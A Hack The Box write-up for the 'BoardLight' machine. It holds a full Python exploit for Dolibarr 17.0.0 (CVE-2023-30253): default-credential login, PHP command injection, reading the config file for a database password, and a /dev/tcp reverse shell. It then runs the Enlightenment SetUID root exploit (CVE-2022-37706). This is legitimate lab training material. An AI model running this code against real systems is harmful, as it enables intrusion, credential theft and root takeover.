+++
authors = ["Shengtuo Hu"]
title = "BoardLight"
description = "Hack The Box - BoardLight"
date = 2025-11-29T15:34:00-08:00
[taxonomies]
tags = ["HackTheBox"]
[extra]
toc = true
toc_sidebar = true
+++

<https://www.hackthebox.com/machines/boardlight>

## Port Scanning

```bash
sudo nmap -vv -sC -sV -T4 -A 10.129.231.37
```

```python
from common import scan_ports

TARGET_HOST = "10.129.231.37"

scan_ports(TARGET_HOST)
```

Scanning output:

```txt
Nmap is installed.
Ports:
{'protocol': 'tcp', 'portid': '22'}
{'name': 'ssh', 'product': 'OpenSSH', 'version': '8.2p1 Ubuntu 4ubuntu0.11', 'extrainfo': 'Ubuntu Linux; protocol 2.0', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}
{'protocol': 'tcp', 'portid': '80'}
{'name': 'http', 'product': 'Apache httpd', 'version': '2.4.41', 'extrainfo': '(Ubuntu)', 'method': 'probed', 'conf': '10'}

OS Matches:
{'name': 'Linux 4.15 - 5.19', 'accuracy': '100', 'line': '70533'}
{'name': 'MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)', 'accuracy': '100', 'line': '91791'}
```

## Subdomain Discovery

```python
FFUF_OUTPUT_PATH = "/tmp/ffuf_output.json"
```

```python
%%script env outfile="$FFUF_OUTPUT_PATH" bash
ffuf -u http://10.129.231.37 -H "Host: FUZZ.board.htb" -w ~/Developer/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -o "$outfile"
```

```python
import json

with open(FFUF_OUTPUT_PATH, "r") as fp:
    ffuf_output = json.load(fp)
print(f"FFUF output ({len(ffuf_output['results'])} in total):")
for entry in ffuf_output["results"]:
    print(f" - {entry['input']['FUZZ']}: {entry['host']}")

assert len(ffuf_output["results"]) == 1

new_host = ffuf_output["results"][0]["host"]
```

`ffuf` output:

```txt
FFUF output (1 in total):
- crm: crm.board.htb
```

## Manual Inspection against the Newly Found Website

We can find the following key information:

- Application: `Dolibarr`
- Version: `17.0.0`
- Related CVE: `CVE-2023-30253`

## Exploit the Website

```python
# Default credentials of Dolibarr
USERNAME = "admin"
PASSWORD = "admin"
```

```python
SITE_NAME = "EXPLOIT"
PAGE_NAME = "EXPLOIT"
CONF_FILE_PATH = "/var/www/html/crm.board.htb/htdocs/conf/conf.php"
```

```python
from yarl import URL

BASE_URL: URL = URL(f"http://{new_host}")
LOGIN_URL: URL = BASE_URL / "index.php"
ADMIN_URL: URL = BASE_URL / "admin/index.php"
WEBSITE_API_URL: URL = BASE_URL / "website/index.php"
EXPLOIT_PAGE_URL: URL = BASE_URL / "public/website/index.php"
```

### Shell as `www-data`

```python
import re
from datetime import datetime
from typing import Optional

import aiohttp
from bs4 import BeautifulSoup, Tag
from yarl import URL

credentials = {}


async def get_csrf_token(
    session: aiohttp.ClientSession, url: URL
) -> Optional[str]:
    async with session.get(url) as resp:
        # Extract CSRF token from the response
        html_content = await resp.text()
        soup = BeautifulSoup(html_content, "html.parser")
        meta_tag = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})

        if meta_tag is not None and isinstance(meta_tag, Tag):
            csrf_token = meta_tag.get("content")
            if csrf_token is not None and isinstance(csrf_token, str):
                return csrf_token

        return None


async def login(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    username: str,
    password: str,
) -> bool:
    data = {
        "token": csrf_token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
        "backtopage": "",
        "tz": "-8",
        "tz_string": "America/New_York",
        "dst_observed": "1",
        "dst_first": "2025-03-9T01:59:00Z",
        "dst_second": "2025-11-2T01:59:00Z",
        "screenwidth": "1032",
        "screenheight": "1294",
        "dol_hide_topmenu": "",
        "dol_hide_leftmenu": "",
        "dol_optimize_smallscreen": "",
        "dol_no_mouse_hover": "",
        "dol_use_jmobile": "",
        "username": username,
        "password": password,
    }
    resp = await session.post(url, data=data)
    return resp.status == 200


async def create_site(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
) -> bool:
    data = aiohttp.FormData()
    data.add_field("token", csrf_token)
    data.add_field("backtopage", "")
    data.add_field("dol_openinpopup", "")
    data.add_field("action", "addsite")
    data.add_field("website", "-1")
    data.add_field("WEBSITE_REF", site_name)
    data.add_field("WEBSITE_LANG", "en")
    data.add_field("WEBSITE_OTHERLANG", "")
    data.add_field("WEBSITE_DESCRIPTION", "")
    data.add_field("virtualhost", f"http://{site_name}.local/")
    data.add_field("addcontainer", "Create")

    resp = await session.post(url, data=data)
    return resp.status == 200


async def get_pageid(html_content: str, page_name: str) -> Optional[int]:
    soup = BeautifulSoup(html_content, "html.parser")
    page_selector = soup.find(
        "select", attrs={"name": "pageid", "id": "pageid"}
    )

    if page_selector is not None and isinstance(page_selector, Tag):
        pattern = re.compile(rf"\[page \d+\] {re.escape(page_name)} .*$")
        for option_tag in page_selector.find_all(name="option"):
            if option_tag is not None and isinstance(option_tag, Tag):
                if pattern.search(option_tag.text) is not None:
                    pageid_str = option_tag.get("value")
                    if (
                        pageid_str is not None
                        and isinstance(pageid_str, str)
                        and pageid_str.isdigit()
                    ):
                        return int(pageid_str)

    return None


async def create_page(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
    page_name: str,
) -> Optional[int]:
    data = aiohttp.FormData()
    data.add_field("token", csrf_token)
    data.add_field("backtopage", "")
    data.add_field("dol_openinpopup", "")
    data.add_field("action", "addcontainer")
    data.add_field("website", site_name)
    data.add_field("pageidbis", "-1")
    data.add_field("pageid", "")
    data.add_field("radiocreatefrom", "checkboxcreatemanually")
    data.add_field("WEBSITE_TYPE_CONTAINER", "page")
    data.add_field("sample", "empty")
    data.add_field("WEBSITE_TITLE", "EXPLOIT")
    data.add_field("WEBSITE_PAGENAME", page_name)
    data.add_field("WEBSITE_ALIASALT", "")
    data.add_field("WEBSITE_DESCRIPTION", "")
    data.add_field("WEBSITE_IMAGE", "")
    data.add_field("WEBSITE_KEYWORDS", "")
    data.add_field("WEBSITE_LANG", "en")
    data.add_field("WEBSITE_AUTHORALIAS", "")
    data.add_field("datecreation", "08/21/2025")
    data.add_field("datecreationday", "21")
    data.add_field("datecreationmonth", "08")
    data.add_field("datecreationyear", "2025")
    data.add_field("datecreationhour", "20")
    data.add_field("datecreationmin", "00")
    data.add_field("datecreationsec", "00")
    data.add_field("htmlheader_x", "")
    data.add_field("htmlheader_y", "")
    data.add_field("htmlheader", "")
    data.add_field("addcontainer", "Create")
    data.add_field("externalurl", "")
    data.add_field("grabimages", "1")
    data.add_field("grabimagesinto", "root")

    resp = await session.post(url, data=data)
    if resp.status != 200:
        return None

    return await get_pageid(await resp.text(), page_name)


async def edit_page(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
    pageid: int,
    cmd: str,
) -> bool:
    # NOTE: "pHp" is used instead of "php" to bypass simple filters.
    page_content: str = (
        f"""
<section id="exploit-section" contenteditable="true">
    <?pHp system("{cmd}")?>
</section>
""".strip()
    )

    data = aiohttp.FormData()
    data.add_field("token", csrf_token)
    data.add_field("backtopage", "")
    data.add_field("dol_openinpopup", "")
    data.add_field("action", "updatesource")
    data.add_field("website", site_name)
    data.add_field("pageid", str(pageid))
    data.add_field("update", "Save")
    data.add_field("PAGE_CONTENT_x", "8")
    data.add_field("PAGE_CONTENT_y", "2")
    data.add_field("PAGE_CONTENT", page_content)

    resp = await session.post(url, data=data)
    return resp.status == 200


async def get_output(html_content: str) -> str:
    soup = BeautifulSoup(html_content, "html.parser")
    exploit_section = soup.find("section", attrs={"id": "exploit-section"})

    if exploit_section is not None and isinstance(exploit_section, Tag):
        return str(exploit_section).strip()

    return ""


async def run_cmd(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
    page_name: str,
    pageid: int,
    cmd: str,
) -> Optional[str]:
    # Edit the page to inject the command
    is_page_edited = await edit_page(
        session, url, csrf_token, site_name, pageid, cmd
    )
    if not is_page_edited:
        raise ValueError("Failed to edit the exploit page.")
    print("Exploit page edited successfully.")

    # Access the exploit page
    url = EXPLOIT_PAGE_URL % {
        "website": site_name,
        "pageref": page_name,
    }
    async with session.get(url) as resp:
        if resp.status != 200:
            print(f"Failed to access exploit page: {resp.status}")
            return None

        print("Exploit page accessed successfully.")
        response_text = await resp.text()
        output = await get_output(response_text)
        return output


CONF_PATTERN = re.compile(
    r"\$dolibarr_main_db_user='(?P<username>.*)';\n\$dolibarr_main_db_pass='(?P<password>.*)';"
)


async def access_conf_file(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
    page_name: str,
    pageid: int,
):
    # Edit the page to read the configuration file
    cmd = f"id && pwd && cat {CONF_FILE_PATH}"
    output = await run_cmd(
        session, url, csrf_token, site_name, page_name, pageid, cmd
    )
    if output is not None:
        match = CONF_PATTERN.search(output)
        if match is not None:
            username = match.group("username")
            print(f"Username: {username}")
            password = match.group("password")
            print(f"Password: {password}")
            credentials["larissa"] = password
        else:
            print(f"{output=}")


async def create_reverse_shell(
    session: aiohttp.ClientSession,
    url: URL,
    csrf_token: str,
    site_name: str,
    page_name: str,
    pageid: int,
    lhost: str,
    lport: int,
):
    # Edit the page to create a reverse shell
    cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    await run_cmd(session, url, csrf_token, site_name, page_name, pageid, cmd)


async def exploit(
    lhost: str,
    lport: int,
):
    # Append datetime to the site name to avoid conflicts
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    site_name: str = f"{SITE_NAME}_{current_datetime}"
    page_name: str = f"{PAGE_NAME}_{current_datetime}"

    async with aiohttp.ClientSession() as session:
        # Get CSRF token
        csrf_token = await get_csrf_token(session, LOGIN_URL)
        if csrf_token is None:
            raise ValueError("CSRF token not found in the response.")
        print(f"CSRF token: {csrf_token}")

        # Login as admin
        is_logged_in = await login(
            session, LOGIN_URL, csrf_token, USERNAME, PASSWORD
        )
        if not is_logged_in:
            raise ValueError("Login failed.")
        print("Login successful.")

        # Get CSRF token
        csrf_token = await get_csrf_token(session, ADMIN_URL)
        if csrf_token is None:
            raise ValueError("CSRF token not found in the response.")
        print(f"CSRF token: {csrf_token}")

        # Create a website
        is_website_created = await create_site(
            session, WEBSITE_API_URL, csrf_token, site_name
        )
        if not is_website_created:
            raise ValueError("Failed to create website.")
        print("Website created successfully.")

        # Create a new page
        pageid = await create_page(
            session, WEBSITE_API_URL, csrf_token, site_name, page_name
        )
        if pageid is None:
            raise ValueError("Failed to create the exploit page.")
        print(f"Exploit page ({pageid=}) created successfully.")

        # Access the configuration file
        await access_conf_file(
            session, WEBSITE_API_URL, csrf_token, site_name, page_name, pageid
        )

        signal = input("Do you want to create a reverse shell? (y/n): ")
        if signal.lower() != "y":
            return

        # Create a reverse shell
        await create_reverse_shell(
            session,
            WEBSITE_API_URL,
            csrf_token,
            site_name,
            page_name,
            pageid,
            lhost,
            lport,
        )
```

If we want to obtain the shell, remember to run the following command and wait for a shell

```bash
nc -lnvp 443
```

Here we go!

```python
await exploit(TARGET_HOST, 443)
```

Exploit output:

```txt
CSRF token: 686af698b1845c9c8d86c58e6468ab5f
Login successful.
CSRF token: 686af698b1845c9c8d86c58e6468ab5f
Website created successfully.
Exploit page (pageid=52) created successfully.
Exploit page edited successfully.
Exploit page accessed successfully.
Username: dolibarrowner
Password: serverfun2$2023!!
```

## Shell as `larissa`

Try the password obtained from the configuration file

```python
import asyncssh

if "larissa" not in credentials:
    raise ValueError("No credentials for user 'larissa' found.")

username = "larissa"
password = credentials[username]

async with asyncssh.connect(
    TARGET_HOST, username=username, password=password
) as conn:
    # Check user
    result = await conn.run("id", check=True)
    print(result.stdout, end="")

    # Obtain the flag
    result = await conn.run("cat user.txt", check=True)
    if result.stdout is not None:
        dev_flag = result.stdout.strip()
        print(f"Dev flag: {dev_flag}")
```

Output:

```txt
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
Dev flag: 8fbd769275e2e813edf71e6521556f2d
```

## Shell as `root`

Exploit `CVE-2022-37706` to get `root` access

### Enumerate Vulnerable Targets under `larissa`

```python
import asyncssh

if "larissa" not in credentials:
    raise ValueError("No credentials for user 'larissa' found.")

username = "larissa"
password = credentials[username]

async with asyncssh.connect(
    TARGET_HOST, username=username, password=password
) as conn:
    # Check user
    result = await conn.run("id", check=True)
    print(result.stdout, end="")

    # Check privilege
    result = await conn.run(f"echo {password} | sudo -S -l")
    if result.exit_status != 0:
        print("No sudo privileges.")
        print(result.stderr, end="")
    else:
        print(result.stdout, end="")

    # Check binaries with SetUID privileges
    result = await conn.run("find / -perm -4000 -type f 2>/dev/null")
    if result.stdout is not None:
        print("SetUID binaries found:")
        suid_binaries = result.stdout.strip().splitlines()
        for binary in suid_binaries:
            print(f" - {binary}")
        print()
```

Output:

```txt
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
No sudo privileges.
[sudo] password for larissa: Sorry, try again.
[sudo] password for larissa:
sudo: no password was provided
sudo: 1 incorrect password attempt
SetUID binaries found:
 - /usr/lib/eject/dmcrypt-get-device
 - /usr/lib/xorg/Xorg.wrap
 - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
 - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
 - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
 - /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
 - /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 - /usr/lib/openssh/ssh-keysign
 - /usr/sbin/pppd
 - /usr/bin/newgrp
 - /usr/bin/mount
 - /usr/bin/sudo
 - /usr/bin/su
 - /usr/bin/chfn
 - /usr/bin/umount
 - /usr/bin/gpasswd
 - /usr/bin/passwd
 - /usr/bin/fusermount
 - /usr/bin/chsh
 - /usr/bin/vmware-user-suid-wrapper
```

### Exploit Enlightenment

```python
import asyncssh

if "larissa" not in credentials:
    raise ValueError("No credentials for user 'larissa' found.")

username = "larissa"
password = credentials[username]

async with asyncssh.connect(
    TARGET_HOST, username=username, password=password
) as conn:
    # Find the target binary with SetUID
    result = await conn.run(
        "find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1",
        check=True,
    )
    if result.stdout is None:
        raise ValueError("Target binary not found.")
    target_binary = result.stdout.strip()
    print(f"Target binary: {target_binary}")

    # Create necessary directories and files for exploitation
    await conn.run("mkdir -p /tmp/net", check=True)
    await conn.run('mkdir -p "/dev/../tmp/;/tmp/exploit"', check=True)
    ## NOTE: we can run the shell command here as well
    await conn.run(
        'echo "id && cat /root/root.txt" > /tmp/exploit', check=True
    )
    await conn.run("chmod a+x /tmp/exploit", check=True)

    # Here we go!
    result = await conn.run(
        f'{target_binary} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net',
        check=True,
    )
    print(result.stdout, end="")
```

Output:

```txt
Target binary: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
42a1a4cedab17d94ded5af0f3774755f
```

## References

- [HTB: BoardLight | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html)
- [Arbitrary Command Injection in dolibarr/dolibarr | CVE-2023-30253 | Snyk](https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595)
- [nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
- [MaherAzzouzi/CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
